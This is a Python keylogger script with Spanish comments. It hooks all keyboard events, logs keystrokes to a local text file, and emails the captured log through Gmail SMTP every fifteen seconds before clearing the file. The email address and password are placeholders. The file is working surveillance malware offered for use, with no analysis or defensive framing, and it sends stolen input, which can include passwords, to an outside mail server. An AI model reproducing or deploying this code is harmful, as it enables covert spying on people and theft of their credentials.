from functools import partial
import atexit
import os
import keyboard, pythoncom
import datetime, time



MAP = {
        "space": " ",
        "\r": "\n"
    }
FILE_NAME = "pulsaciones_grabadas.txt"
CLEAR_ON_STARTUP = False
TERMINATE_KEY = "esc"
TIME_KEY = 15

timeout=time.time() + TIME_KEY


def TimeOut():
    if time.time() > timeout:
        return True
    else:
        return False


def email(usuario, contrasena, destino, asunto, texto):
    import smtplib

    mailUser=usuario
    mailPass=contrasena
    From=usuario
    To=destino if type(destino) is list else [destino]
    Subject=asunto
    Txt=texto

    email = """\From: %s\nTo: %s\nSubject: %s\n\n%s """ %(From, ", ".join(To), Subject, Txt)

    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.ehlo()
        server.starttls()
        server.login(mailUser, mailPass)
        server.sendmail(From, To, email)
        server.close()
        print ('Correo enviado.')
    except:
        print('Fallo al enviar el correo')


def enviarEmail():
    with open (FILE_NAME, 'r+') as f:
        fecha=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        data=f.read()
        data=data.replace('\n', '')
        data='Log capturado a las: ' + fecha +'\n' + data

        print(data)

        email('TU CORREO', 'CONTRASEÑA DE TU CORREO', 'TU CORREO', 'SUBJECT' + fecha, data)

        f.seek(0)
        f.truncate()



def callback(output, is_down, event):
        if event.event_type in ("up", "down"):
            key = MAP.get(event.name, event.name)
            modifier = len(key) > 1
            # Capturar únicamente los modificadores cuando están siendo
            # presionados.
            if not modifier and event.event_type == "down":
                return
            # Evitar escribir múltiples veces la misma tecla si está
            # siendo presionada.
            if modifier:
                if event.event_type == "down":
                    if is_down.get(key, False):
                        return
                    else:
                        is_down[key] = True
                elif event.event_type == "up":
                    is_down[key] = False
                # Indicar si está siendo presionado.
                key = " [{} ({})] ".format(key, event.event_type)
            elif key == "\r":
                # Salto de línea.
                key = "\n"
            # Escribir la tecla al archivo de salida.
            output.write(key)
            # Forzar escritura.
            output.flush()
def onexit(output):
        output.close()



def main():
        # Borrar el archivo previo.
        if CLEAR_ON_STARTUP:
            os.remove(FILE_NAME)
        
        # Indica si una tecla está siendo presionada.
        is_down = {}
        
        # Archivo de salida.
        output = open(FILE_NAME, "a")
        
        # Cerrar el archivo al terminar el programa.
        atexit.register(onexit, output)
        
        # Instalar el registrador de teclas.
        keyboard.hook(partial(callback, output, is_down))
        keyboard.wait(TERMINATE_KEY)
        
if __name__ == "__main__":
            main()

while True:                                                             #bucle para mandar el correo, se ejecuta siempre
    if TimeOut():                                                       #llamamos al método TimeOut para ver si toca mandar correo, tiene que devolver un true
        enviarEmail()                                                   #si devuelve un true, se llama al método de enviar email
        timeout = time.time() + TIME_KEY                        #calcúlamos un nuevo timeout con el tiempo de espera configurado

    pythoncom.PumpWaitingMessages()                                     #ejecuta los registros que están en espera
